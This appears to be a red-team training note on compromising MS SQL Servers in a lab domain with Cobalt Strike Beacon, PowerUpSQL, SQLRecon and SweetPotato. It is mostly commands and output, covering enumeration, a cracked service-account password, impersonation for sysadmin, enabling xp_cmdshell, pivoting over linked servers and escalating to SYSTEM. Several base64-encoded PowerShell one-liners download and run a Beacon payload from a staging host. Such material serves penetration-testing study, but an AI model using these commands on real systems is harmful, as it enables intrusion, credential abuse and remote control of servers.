---
description: 10/01/2025
---

# ✅ MS SQL Servers

## MS SQL Lateral Movement

Microsoft SQL Server is a relational database management system commonly found in Windows environments.

They are typically used to store information for a variety of reasons.

### Attack Surface

In addition to obvious data theft opportunities, they have an extremely large attack surface, allowing code execution, privilege escalation, lateral movement, and persistence.

### Interacting with MS SQL Servers

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) are excellent tools for enumerating and interacting with MS SQL Servers.

<mark style="color:yellow;">`PowerUpSQL`</mark> has a few cmdlets available for finding MS SQL Servers, including <mark style="color:yellow;">`Get-SQLInstanceDomain`</mark>, <mark style="color:yellow;">`Get-SQLInstanceBroadcast`</mark> and <mark style="color:yellow;">`Get-SQLInstanceScanUDP`</mark>:

```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain

ComputerName     : sql-2.dev.cyberbotic.io
Instance         : sql-2.dev.cyberbotic.io,1433
DomainAccountSid : 1500000521000672332383313895871914512914091400
DomainAccount    : mssql_svc
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
LastLogon        : 8/15/2022 7:55 PM
Description      :
```

`Get-SQLInstanceDomain` works by searching for SPNs that begin with _MSSQL\*_.  This output shows that SQL-2 is running an instance of MS SQL server, under the context of the `mssql_svc` domain account.  You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

<mark style="color:yellow;">**`Get-SQLConnectionTest`**</mark>**&#x20;can be used to test whether or not we can connect to the database:**

```
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

ComputerName : sql-2.dev.cyberbotic.io
Instance     : sql-2.dev.cyberbotic.io,1433
Status       : Accessible
```

**Then use&#x20;**<mark style="color:yellow;">**`Get-SQLServerInfo`**</mark>**&#x20;to gather more information about the instance:**

```
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

ComputerName           : sql-2.dev.cyberbotic.io
Instance               : SQL-2
DomainName             : DEV
ServiceProcessID       : 2668
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\mssql_svc
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : No
ActiveSessions         : 1
```

{% hint style="info" %}
**If there are&#x20;**<mark style="color:green;">**multiple SQL Servers available**</mark>**, you can chain these commands together to automate the data collection:**

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
{% endhint %}

SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the `info` module.

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

[*] Looking for MSSQL SPNs ...
[*] 1 found.

 |-> ComputerName:  sql-2.dev.cyberbotic.io
 |-> Instance:      sql-2.dev.cyberbotic.io:1433
 |-> AccountSid:    S-1-5-21-569305411-121244042-2357301523-1115
 |-> AccountName:   mssql_svc
 |-> AccountCn:     MS SQL Service
 |-> Service:       MSSQLSvc
 |-> SPN:           MSSQLSvc/sql-2.dev.cyberbotic.io:1433
 |-> LastLogon:     1/24/0423 12:48:15 PM
 
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

[*] Extracting SQL Server information from sql-2.dev.cyberbotic.io

 |-> ComputerName:           SQL-2
 |-> DomainName:             DEV
 |-> ServicePid:             4388
 |-> ServiceName:            MSSQLSERVER
 |-> ServiceAccount:         DEV\mssql_svc
 |-> AuthenticationMode:     Windows Authentication
 |-> ForcedEncryption:       0
 |-> Clustered:              No
 |-> SqlServerVersionNumber: 15.0.2000.5
 |-> SqlServerMajorVersion:  2019
 |-> SqlServerEdition:       Standard Edition (64-bit)
 |-> SqlServerServicePack:   RTM
 |-> OsArchitecture:         X64
 |-> OsVersionNumber:        2022
 |-> CurrentLogin:           DEV\bfarmer
 |-> IsSysAdmin:             No
 |-> ActiveSessions:         1
```

<br>

The `/auth:wintoken` option allows SQLRecon to use the access token of the Beacon.  This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  SQLRecon has a nice module which can show us what roles we do have.

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\bfarmer
[*] Mapped to the user guest
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is NOT a member of sysadmin role.
 |-> User is NOT a member of setupadmin role.
 |-> User is NOT a member of serveradmin role.
 |-> User is NOT a member of securityadmin role.
 |-> User is NOT a member of processadmin role.
 |-> User is NOT a member of diskadmin role.
 |-> User is NOT a member of dbcreator role.
 |-> User is NOT a member of bulkadmin role.
```

<br>

On default installations, standard users do not have this "public" role by default and must be explicitly granted through [SQL Server Manager Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (SSMS).  The aforementioned information on a SQL instance cannot be enumerated if the user's security context does not have a valid role.

<br>

![](https://files.cdn.thinkific.com/file_uploads/584845/images/3ff/4cb/2fa/roles.png)

<br>

Finding a user (or group) that does have access can be challenging, because without the ability to query the SQL instance to ask it, you can be stuck guessing.  One port of call is to look for appropriately named domain groups and their members.

```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

GroupName     MemberName
---------     ----------
MS SQL Admins jking
```

Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges.  This assumption is the basis of BloodHound's SQLAdmin attack path. &#x20;

We know that the domain account being used to run the service is `DEV\mssql_svc` and that the account is kerberoastable owing to its SPN. &#x20;

<mark style="color:$danger;">**If we can crack its plaintext password, we can use it to gain access to the SQL instance.**</mark> &#x20;

**The credentials can be used with `make_token` in Beacon and `/a:WinToken` in SQLRecon; or the `/a:WinDomain` option with `/d:<domain> /u:<username> /p:<password>` in SQLRecon directly.**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

\
**Once we have access, there are several options for issuing queries against a SQL instance.  `Get-SQLQuery` from PowerUpSQL:**

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SQL-2
```

**SQLRecon:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

[*] Executing 'select @@servername' on sql-2.dev.cyberbotic.io,1433
column0 | 
----------
SQL-2 |
```

**`mssqlclient.py` from Impacket via proxychains:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL> select @@servername;

--------------------------------------------------------------------------------------------------------------------------------

SQL-2
```

**Or a Windows SQL GUI, such as** [**HeidiSQL**](https://www.heidisql.com/)**via Proxifier:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/574/967/edc/heidi.png)

## MS SQL Impersonation

_**MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.**_ &#x20;

One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.

**Impersonations must be explicitly granted through securable configurations:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/1ac/eb4/226/securables.png)

In this example, `DEV\Domain Users` have been granted the ability to impersonate the `DEV\mssql_svc` account.  This is clearly a security issue because it gives all Domain Users sysadmin privileges on this instance.

**We can discover accounts to impersonate manually using the following queries:**

```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/faf/047/15b/impersonations.png)

**This shows that the `grantee_principal_id`, 268, is allowed to impersonate the `grantor_principal_id`, 267.  The IDs don't mean much, so we can look them up with:**

```
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/582/4f2/a54/principals.png)

Here, we see that `267` is `DEV\mssql_svc` and `268` is `DEV\Domain Users`.

**You can also write your own SQL query that will join these two, or use `SQLRecon`'s impersonate module:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
name | 
-------
DEV\mssql_svc |
```

**We can take advantage of this as `bfarmer`, who we know is not a sysadmin:**

```
SELECT SYSTEM_USER;
DEV\bfarmer

SELECT IS_SRVROLEMEMBER('sysadmin');
0
```

**Use `EXECUTE AS` to execute a query in the context of the target:**

```
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

**SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an `i` and specifying the principal to impersonate:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433 as 'DEV\mssql_svc'
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] [+] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

## MS SQL Command Execution

The _xp\_cmdshell_ procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges. &#x20;

**`Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it:**

```
beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\mssql_svc
```

**The same will fail if you try manually in Heidi or mssqlclient, because xp\_cmdshell is disabled:**

```
SQL> EXEC xp_cmdshell 'whoami';
[-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
```

**To enumerate the current state of xp\_cmdshell, use:**

```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/406/8c2/83c/xpcmdshell-disabled.png)

**A value of&#x20;**_**0**_**&#x20;shows that xp\_cmdshell is disabled. To enable it:**

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**Query sys.configurations again and the xp\_cmdshell value should be&#x20;**_**1**_**; and xp\_cmdshell will also now work:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/d9c/f07/b8a/xpcmdshell.png)

{% hint style="danger" %}
**OPSEC**\
\
**If you're going to make this type of configuration change to a target, you must ensure you set it back to its original value afterwards.**\
\
The reason this works with `Invoke-SQLOSCmd` is because it will automatically attempt to enable xp\_cmdshell if it's not already, execute the given command, and then disable it again.  This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.
{% endhint %}

**SQLRecon also has a module for interacting with the xp\_cmdshell configuration, which can also be combined with the impersonation module:**

```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc

[*] Enabling xp_cmdshell as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433
[+] SUCCESS: Enabled xp_cmdshell on sql-2.dev.cyberbotic.io,1433.
name | value | 
---------------
xp_cmdshell | 1 |

beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig

[*] Executing 'ipconfig' as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433.
output | 
---------
 | 
Windows IP Configuration | 
 | 
 | 
Ethernet adapter Ethernet: | 
 | 
   Connection-specific DNS Suffix  . : ec2.internal | 
   IPv4 Address. . . . . . . . . . . : 10.10.122.25 | 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0 | 
   Default Gateway . . . . . . . . . : 10.10.122.1 | 
 |
```

With command execution, we can work towards executing a Beacon payload. &#x20;

As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload. &#x20;

**Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain:**

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

**Next, host `smb_x64.ps1` at `/b` on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server:**

```
beacon> portscan 10.10.122.25 445
(ICMP) Target '10.10.122.25' is alive. [read 8 bytes]
10.10.122.25:445 (platform: 500 version: 10.0 name: SQL-2 domain: DEV)
Scanner module is complete
```

**We can now download and execute the payload, for example:**

```
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
```

OR

```
powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
```

**Keep an eye on your web log so you know when the payload has been fetched:**

```
01/05 15:09:07 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
	null
```

**You can then link to the Beacon:**

```
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
[+] established link to child beacon: 10.10.122.25
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/028/123/c7d/mssqlsvc-beacon.png)

{% hint style="info" %}
**What payload would you use if port 445 was closed?**&#x20;

**Experiment with using the pivot listener here instead of SMB.**
{% endhint %}

## MS SQL Lateral Movement

SQL Servers have a concept called "links".

These links allows a database instance to access data from an external source.

MS SQL supports multiple sources, including other MS SQL servers. These can also be practically anywhere — include other domains, forests or in the cloud.

**Discover any links that the current instance has:**

```
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**This shows that SQL-2 has a link to SQL-1.  The SQLRecon `links` module could also be used:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links

[*] Additional SQL links on sql-2.dev.cyberbotic.io,1433
name | product | provider | data_source | 
------------------------------------------
SQL-1.CYBERBOTIC.IO | SQL Server | SQLNCLI | SQL-1.CYBERBOTIC.IO |
```

**We can send SQL queries to linked servers using&#x20;**_**OpenQuery**_**:**

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

{% hint style="info" %}
_**The use of double and single quotes is important when using OpenQuery.**_
{% endhint %}

**Or with SQLRecon:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

[*] Executing 'select @@servername' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
column0 | 
----------
SQL-1 |
```

**We can also check the xp\_cmdshell status.**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

[*] Executing 'select name,value from sys.configurations WHERE name = ''xp_cmdshell''' on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
name | value | 
---------------
xp_cmdshell | 0 |
```

If `xp_cmdshell` is disabled, you won't be able to enable it by executing `sp_configure` via `OpenQuery`. &#x20;

**If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:**

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
```

{% hint style="info" %}
The square braces are required.
{% endhint %}

We can query SQL-1 to find out if it has any further links.

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io

[*] Additional SQL links on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
[+] No results.
```

<br>

In this case it does not, but manually querying each server to find additional links can be cumbersome and time-consuming.  Instead, `Get-SQLServerLinkCrawl` can automatically crawl all available links and shows you a bit of information for each instance.

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"

Version     : SQL Server 2019 
Instance    : SQL-2
CustomQuery : 
Sysadmin    : 1
Path        : {SQL-2}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2019 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SQL-2, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       :
```

This output shows that the link from `SQL-2` to `SQL-1` is configured with a local `sa` account, and that it has sysadmin privileges on the remote server. &#x20;

Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1. &#x20;

_**We do not need to be sysadmin on SQL-2 first.**_

**The&#x20;**<mark style="color:yellow;">**`lwhoami`**</mark>**&#x20;module in SQLRecon can show similar information:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io

[*] Determining user permissions on sql-1.cyberbotic.io via sql-2.dev.cyberbotic.io,1433
[*] Logged in as sa
[*] Mapped to the user dbo
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

To execute a Beacon on `SQL-1`, we can pretty much repeat the same steps as previously.  However, note that `SQL-1` may only be able to talk to `SQL-2` and not to `WKSTN-2` or any other machine in the `DEV` domain.

```
beacon> run hostname
sql-2

beacon> getuid
[*] You are DEV\mssql_svc (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

**You can use `xp_cmdshell` on a linked server via `OpenQuery` (note that you need to prepend a dummy query) for it to work:**

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
```

**Or you can use the "AT" syntax:**

```
EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]
```

`SQLRecon` also has a convenient <mark style="color:yellow;">`lxpcmd`</mark> module.

**Once the payload has been executed, connect to the Beacon:**

```
beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
[+] established link to child beacon: 10.10.120.25
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/066/c4e/679/sql-1-beacon.png)

## MS SQL Privilege Escalation

This instance of SQL is running as <mark style="color:yellow;">`NT Service\MSSQLSERVER`</mark>, which is the default during more modern SQL installations.

It has a _**special type of privilege**_ called <mark style="color:yellow;">`SeImpersonatePrivilege`</mark>, which allows the account to "<mark style="color:$danger;">impersonate a client after authentication</mark>".

**How to:**

```
beacon> getuid
[*] You are NT Service\MSSQLSERVER

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED

[*] Completed collection in 0.037 seconds
```

### At a high level

This privilege allows the user to impersonate a token that it's able to get a handle to.

However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. `SYSTEM`) already running on the machine.

A strategy that many hackers have come up with is to force a `SYSTEM` service to authenticate to a rogue service that the attacker creates and thus has control over.

This rogue service is then able to impersonate the `SYSTEM` service while it is trying to authenticate.

[**SweetPotato**](https://github.com/CCob/SweetPotato) **has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command:**

```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering notification on evil PIPE \\sql-1/pipe/b888d569-b66e-4280-b8c5-995afbb9b02c
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 4444
[+] established link to child beacon: 10.10.120.25
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
